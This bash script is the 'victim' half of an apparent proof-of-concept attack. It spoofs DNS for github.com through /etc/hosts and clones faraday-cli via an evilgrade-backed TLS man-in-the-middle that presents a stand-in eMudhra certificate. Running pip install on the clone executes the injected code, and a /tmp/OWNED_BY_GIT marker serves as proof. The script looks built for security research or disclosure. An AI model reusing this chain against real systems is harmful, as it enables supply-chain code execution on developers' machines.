#!/bin/bash
###############################################################################
# victim_git.sh - VICTIM side only. Clones faraday-cli and installs it against
#                 a MITM TLS endpoint already running on github.com:443.
#
# Does NOT start anything server-side. Assumes the eMudhra MITM endpoint is up
# on :443 (the tls_frontend.py shim in front of evilgrade, presenting the
# certs/emudhra_mitm cert) and that github.com resolves to it. Adds the
# /etc/hosts entry itself (sudo, reverted on exit) unless --no-hosts.
#
# Usage: demo/emudhra_mitm/victim_git.sh [--no-hosts]
#
# Requires an OpenSSL-backed git (brew install git) so trust is decided against
# a FILE CA bundle: http.sslCAInfo points at the demo bundle (real cacert.pem +
# eMudhra stand-in anchor), which simulates eMudhra being trusted. Apple's git
# uses the SecureTransport/Keychain backend instead, so this flag does not
# apply to it; use an OpenSSL-backed git.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
. demo/emudhra_mitm/_lib.sh
NOHOSTS=0; [ "${1:-}" = "--no-hosts" ] && NOHOSTS=1

GIT=$(openssl_git) || { echo "No OpenSSL-backed git (brew install git)."; exit 1; }
CABUNDLE=$(emudhra_ca_bundle)
[ -f "$CABUNDLE" ] || { echo "Demo CA bundle missing: $CABUNDLE"; exit 1; }
HOSTS_LINE="127.0.0.1 github.com www.github.com codeload.github.com"
HOSTS_ADDED=0
cleanup(){ [ "$HOSTS_ADDED" = 1 ] && { sudo sed -i '' "\|^${HOSTS_LINE}\$|d" /etc/hosts 2>/dev/null; echo "[cleanup] reverted /etc/hosts"; }; rm -rf /tmp/victim_faraday_clone; }
trap cleanup EXIT INT TERM

if [ "$NOHOSTS" = 0 ] && ! grep -qF "$HOSTS_LINE" /etc/hosts 2>/dev/null; then
    echo "== DNS spoof: adding '$HOSTS_LINE' to /etc/hosts (sudo; reverted on exit) =="
    echo "$HOSTS_LINE" | sudo tee -a /etc/hosts >/dev/null || { echo "   sudo failed"; exit 1; }
    HOSTS_ADDED=1
fi

rm -f /tmp/OWNED_BY_GIT; rm -rf /tmp/victim_faraday_clone
echo "== step 1: git clone https://github.com/infobyte/faraday-cli.git =="
"$GIT" -c http.sslBackend=openssl -c http.sslCAInfo="$CABUNDLE" \
    clone "https://github.com/infobyte/faraday-cli.git" /tmp/victim_faraday_clone 2>&1 | sed 's/^/   /'
echo "   cloned: $(ls /tmp/victim_faraday_clone 2>/dev/null | tr '\n' ' ')"

echo "== step 2: pip install . =="
( cd /tmp/victim_faraday_clone && timeout 120 /usr/bin/python3 -m pip install \
    --no-build-isolation --no-cache-dir --disable-pip-version-check . 2>&1 | tail -4 | sed 's/^/   /' )
/usr/bin/python3 -m pip uninstall -y faraday-cli >/dev/null 2>&1
sleep 1
echo
echo "== PROOF: /tmp/OWNED_BY_GIT =="
[ -f /tmp/OWNED_BY_GIT ] && sed 's/^/   /' /tmp/OWNED_BY_GIT || echo "   <not created>"
